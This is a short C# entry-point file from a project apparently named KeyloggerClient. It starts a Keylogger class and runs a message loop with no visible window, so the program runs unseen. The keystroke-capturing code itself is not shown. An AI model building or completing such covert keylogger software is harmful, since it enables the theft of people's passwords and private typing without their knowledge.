using System;
using System.Windows.Forms;

namespace KeyloggerClient
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Keylogger.Start();
            Application.Run();
        }
    }
}
